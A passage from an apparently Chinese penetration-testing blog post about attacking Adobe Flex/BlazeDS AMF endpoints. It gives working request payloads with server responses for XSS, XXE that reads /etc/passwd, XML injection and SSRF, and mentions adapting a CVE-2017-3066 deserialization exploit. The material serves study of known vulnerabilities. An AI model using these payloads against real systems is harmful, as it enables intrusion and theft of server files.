    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><ol>
<li><strong><code>&lt;targetURI&gt;</code>和<code>&lt;responseURI&gt;</code></strong>
<ul>
<li><code>targetURI</code>：指定服务器端的目标处理地址，此处为<code>null</code>（通常由 AMF 通道配置自动填充）。</li>
<li><code>responseURI</code>：指定服务器返回结果的回调地址，此处为<code>null</code>（客户端会自动处理返回结果的路由）。</li>
</ul>
</li>
<li><strong><code>&lt;data class=&quot;object-array&quot;&gt;</code></strong>
包含实际的远程调用消息对象，这里是一个<code>RemotingMessage</code>（远程调用消息），用于定义具体的服务调用信息：
<ul>
<li><code>&lt;destination&gt;</code> ：指定服务器端的 “目的地”， 即要调用的服务标识，对应名为<code>manager</code>的服务组件（如 Spring 的 Bean 或 BlazeDS 的 Service）。</li>
<li><code>&lt;messageId&gt;  &lt;/messageId&gt;</code>：消息唯一标识（UUID），用于客户端匹配请求与返回结果（避免异步调用时的混乱）。</li>
<li><code>&lt;timestamp&gt;0&lt;/timestamp&gt;</code> ：消息创建时间戳（此处为<code>0</code>，可能未设置）。</li>
<li><code>&lt;timeToLive&gt;0&lt;/timeToLive&gt;</code> ：消息有效期（毫秒，<code>0</code>表示永不过期）。</li>
<li><code>&lt;operation&gt;</code>： 指定要调用的服务器端方法名，这里是调用<code>manager</code>服务中的<code>searchByParam</code>方法。</li>
<li><code>&lt;parameters&gt;</code>：传递给<code>searchByParam</code>方法的参数
此处参数是一个<code>ASObject</code>（ActionScript 对象），类型为<code>com.fsc.base.model.lookup.LookupJsonModel</code>，包含一个键值对：
<ul>
<li><code>key: &quot;select username from all_users&quot;</code>：即参数对象中<code>key</code>字段的值为 SQL 查询语句。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h5 id="该请求的实际含义" class="heading-element"><span>该请求的实际含义</span>
  <a href="#%e8%af%a5%e8%af%b7%e6%b1%82%e7%9a%84%e5%ae%9e%e9%99%85%e5%90%ab%e4%b9%89" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p>客户端通过 AMF 协议向服务器发送了一个远程调用请求，核心意图是：
<strong>调用服务器端<code>manager</code>服务的<code>searchByParam</code>方法，传入一个<code>LookupJsonModel</code>对象作为参数，该对象的<code>key</code>属性值为 SQL 语句<code>select username from all_users</code>。</strong></p>
</blockquote>
<p>除了这个<code>manager</code>服务中的<code>searchByParam</code>方法，还尝试Fuzz枚举更多的方法来挖掘漏洞，但是没能成功，比较可惜。</p>
<h4 id="反序列化cve-2017-3066" class="heading-element"><span>反序列化(CVE-2017-3066)</span>
  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96cve-2017-3066" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>Adobe Flash的反序列化漏洞挺多的，遇到AMF传输的都可以试下各种反序列化。</p>
<p>这个漏洞是基于 <a href="https://www.exploit-db.com/exploits/43993"target="_blank" rel="external nofollow noopener noreferrer">Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution（CVE-2017-3066）</a> ，简单修改下poc 即可利用，成功收到RMI回连信息，但是后续命令执行遇到问题。</p>
<p>因为时间关系，最终也没完全利用成功。</p>
<h3 id="历史漏洞" class="heading-element"><span>历史漏洞</span>
  <a href="#%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="xss" class="heading-element"><span>XSS</span>
  <a href="#xss" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>以下漏洞都不是自己挖的，来自网络，只是作为补充</p>
<p><a href="https://www.exploit-db.com/exploits/35707"target="_blank" rel="external nofollow noopener noreferrer">BMC Dashboards 7.6.01 - Cross-Site Scripting / Information Disclosure</a></p>
<p>Multiple XSS as the AMF stream is unfiltered</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/bsmdashboards/messagebroker/amfsecure</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-amf</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">target-domain.foo</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">462</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">........null../58.....    ..
</span></span><span class="line"><span class="cl">.COflex.messaging.messages.RemotingMessage.timestamp.headers.operation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bodysource.remotePassword.remoteUsername.parameters.messageId.timeToLive.clientId.destination.........
</span></span><span class="line"><span class="cl">#.
</span></span><span class="line"><span class="cl">DSId.DSEndpoint.IFDCEEFC2-F318-1B37-7F3A-B438E60525E0..bsd-secure-amf...getUndefinedDataSources&lt;script&gt;alert(1)&lt;/script&gt;
</span></span><span class="line"><span class="cl">   ..
</span></span><span class="line"><span class="cl">.qcom.bmc.bsm.dashboards.services.facade.RequestParameters.
</span></span><span class="line"><span class="cl">#.    name.version..208Archive..1.0...
</span></span><span class="line"><span class="cl">.Cflex.messaging.io.ArrayCollection    ..
</span></span><span class="line"><span class="cl">..I3DDF906B-55F2-5E38-38C1-6A08D1AC077B..........IFDDDB883-6F0C-D935-5E7B-25CDF25C3538.-dashboardArchiveFacade</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="o">:</span> <span class="l">Sat, 02 Oct 2010 00:15:35 GMT</span>
</span></span><span class="line"><span class="cl"><span class="n">Server</span><span class="o">:</span> <span class="l">Microsoft-IIS/6.0</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">ASP.NET</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-amf</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">4651</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">......../58/onStatus.......
</span></span><span class="line"><span class="cl">.SIflex.messaging.messages.ErrorMessage.headers.rootCause
</span></span><span class="line"><span class="cl">body.correlationId.faultDetail.faultString.clientId.timeToLive.destination.timestamp.extendedData.faultCode.messageId
</span></span><span class="line"><span class="cl">..
</span></span><span class="line"><span class="cl">..acom.bmc.bsm.dashboards.util.logging.BSDException.message
</span></span><span class="line"><span class="cl">guid!localizedMessage.cause.arguments.priority.traceback.errorCode.causeSummary.System
</span></span><span class="line"><span class="cl">error. Contact your system administrator for assistance.
</span></span><span class="line"><span class="cl">.Kcom.bmc.bsm.dashboards.util.guid.Guid!uniqueIdentifier.AdZZZZZZZZJIiCvq53w9q0gerq4j8y0oq.0
</span></span><span class="line"><span class="cl">.s?flex.messaging.MessageException.errorMessage.&#34;$)logStackTraceEnablednumber
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">codelogged.statusCode..-defaultLogMessageIntro.details#preferredLogLevel+rootCauseErrorMessage
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">......)Method &#39;getUndefinedDataSources&lt;script&gt;alert(1)&lt;/script&gt;&#39; not
</span></span><span class="line"><span class="cl">found...1Cannot invoke method &#39;getUndefinedDataSourcesfdd4d</span></span></code></pre></td></tr></table>
</div>
</div><p>攻击者或许能够使点击了基于 Remedy 知识管理网站链接的用户在其浏览器中执行恶意脚本代码。此类代码将在目标域的安全环境内运行。这种类型的攻击可能导致目标网站的非持久性篡改，或者将机密信息（即会话 ID）重定向到未经授权的第三方。利用此漏洞无需进行身份验证。</p>
<h4 id="xxexml注入" class="heading-element"><span>XXE&amp;XML注入</span>
  <a href="#xxexml%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><a href="https://www.exploit-db.com/exploits/11529"target="_blank" rel="external nofollow noopener noreferrer">Adobe (Multiple Products) - XML External Entity / XML Injection</a></p>
<p>这几漏洞是http 通道的，严格来说，不能算是AMF下的案例，但是确实也是 Flex 框架的，暂时放这吧，本质是一样的。</p>
<p><strong>XXE</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /samples/messagebroker/http HTTP/1.1
</span></span><span class="line"><span class="cl">Content-type: application/x-amf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY x3 SYSTEM &#34;/etc/passwd&#34;&gt;</span> ]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;amfx</span> <span class="na">ver=</span><span class="s">&#34;3&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.macromedia.com/2005/amfx&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;body&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;object</span> <span class="na">type=</span><span class="s">&#34;flex.messaging.messages.CommandMessage&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;traits&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;string&gt;</span>body<span class="nt">&lt;/string&gt;&lt;string&gt;</span>clientId<span class="nt">&lt;/string&gt;&lt;string&gt;</span>correlationId<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;string&gt;</span>destination<span class="nt">&lt;/string&gt;&lt;string&gt;</span>headers<span class="nt">&lt;/string&gt;&lt;string&gt;</span>messageId<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;string&gt;</span>operation<span class="nt">&lt;/string&gt;&lt;string&gt;</span>timestamp<span class="nt">&lt;/string&gt;&lt;string&gt;</span>timeToLive<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/traits&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;object&gt;&lt;traits</span> <span class="nt">/&gt;&lt;/object&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;null</span> <span class="nt">/&gt;&lt;string</span> <span class="nt">/&gt;&lt;string</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;object&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;traits&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;string&gt;</span>DSId<span class="nt">&lt;/string&gt;&lt;string&gt;</span>DSMessagingVersion<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/traits&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;string&gt;</span>nil<span class="nt">&lt;/string&gt;&lt;int&gt;</span>1<span class="nt">&lt;/int&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/object&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;string&gt;</span><span class="ni">&amp;x3;</span><span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">			<span class="nt">&lt;int&gt;</span>5<span class="nt">&lt;/int&gt;&lt;int&gt;</span>0<span class="nt">&lt;/int&gt;&lt;int&gt;</span>0<span class="nt">&lt;/int&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/object&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/body&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/amfx&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>响应体</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;amfx</span> <span class="na">ver=</span><span class="s">&#34;3&#34;</span><span class="nt">&gt;&lt;header</span> <span class="na">name=</span><span class="s">&#34;AppendToGatewayUrl&#34;</span> <span class="na">mustUnderstand=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>;jsessionid=2191D3647221B72039C5B05D38084A42<span class="nt">&lt;/string&gt;&lt;/header&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;body</span> <span class="na">targetURI=</span><span class="s">&#34;/onResult&#34;</span> <span class="na">responseURI=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;object</span> <span class="na">type=</span><span class="s">&#34;flex.messaging.messages.AcknowledgeMessage&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;traits&gt;&lt;string&gt;</span>timestamp<span class="nt">&lt;/string&gt;&lt;string&gt;</span>headers<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>body<span class="nt">&lt;/string&gt;&lt;string&gt;</span>correlationId<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>messageId<span class="nt">&lt;/string&gt;&lt;string&gt;</span>timeToLive<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>clientId<span class="nt">&lt;/string&gt;&lt;string&gt;</span>destination<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/traits&gt;&lt;double&gt;</span>1.257387140632E12<span class="nt">&lt;/double&gt;&lt;object&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;traits&gt;&lt;string&gt;</span>DSMessagingVersion<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>DSId<span class="nt">&lt;/string&gt;&lt;/traits&gt;&lt;double&gt;</span>1.0<span class="nt">&lt;/double&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>BDE929FE-270D-3B56-1061-616E8B938429<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/object&gt;&lt;null/&gt;&lt;string&gt;</span>root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/bin/sh
</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/bin/sh
</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/bin/sh
</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/bin/sh
</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span></span><span class="line"><span class="cl">[...]</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>XML注入</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/samples/messagebroker/http</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-type</span><span class="o">:</span> <span class="l">application/x-amf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;amfx ver=&#34;3&#34;&gt;&lt;body targetURI=&#34;&#34; responseURI=&#34;d&#34; injectedattr=&#34;anything&#34;&gt;&lt;null/&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/amfx&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>响应体</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;amfx</span> <span class="na">ver=</span><span class="s">&#34;3&#34;</span><span class="nt">&gt;&lt;body</span> <span class="na">targetURI=</span><span class="s">&#34;d&#34;</span> <span class="na">injectedattr=</span><span class="s">&#34;anything&#34;</span> <span class="na">responseURI=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;&lt;null/&gt;&lt;/body&gt;&lt;/amfx&gt;&lt;/body&gt;&lt;/amfx&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="xxecve-2015-3269" class="heading-element"><span>XXE(CVE-2015-3269)</span>
  <a href="#xxecve-2015-3269" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ul>
<li>
<p>乌云老文章：<a href="https://wooyun.js.org/drops/AMF%e8%a7%a3%e6%9e%90%e9%81%87%e4%b8%8aXXE%ef%bc%8cBurpSuite%e4%b9%9f%e8%ba%ba%e6%9e%aa.html"target="_blank" rel="external nofollow noopener noreferrer">AMF解析遇上XXE，BurpSuite也躺枪</a></p>
</li>
<li>
<p><a href="https://codewhitesec.blogspot.com/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html"target="_blank" rel="external nofollow noopener noreferrer">CVE-2015-3269: Apache Flex BlazeDS XXE Vulnerabilty</a></p>
</li>
</ul>
<h4 id="ssrfcve-2015-5255" class="heading-element"><span>SSRF(CVE-2015-5255)</span>
  <a href="#ssrfcve-2015-5255" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!DOCTYPE foo PUBLIC &#34;-//VSR//PENTEST//EN&#34;
</span></span><span class="line"><span class="cl">&#34;http://49.x.y.z:8888/protected-service&#34;&gt;&lt;foo&gt;Some content&lt;/foo&gt;</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="我的测试日记" class="heading-element"><span>我的测试日记</span>
  <a href="#%e6%88%91%e7%9a%84%e6%b5%8b%e8%af%95%e6%97%a5%e8%ae%b0" class="heading-mark">
